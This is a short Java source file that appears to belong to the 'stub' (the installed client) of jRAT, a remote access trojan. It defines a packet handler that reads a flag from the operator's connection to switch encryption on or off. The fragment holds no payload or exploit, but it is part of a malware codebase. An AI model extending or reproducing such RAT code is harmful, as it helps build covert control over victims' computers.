package pro.jrat.stub.packets.incoming;

import pro.jrat.stub.Connection;
import pro.jrat.stub.Main;

public class Packet99Encryption extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		Main.encryption = Connection.readBoolean();
	}

}
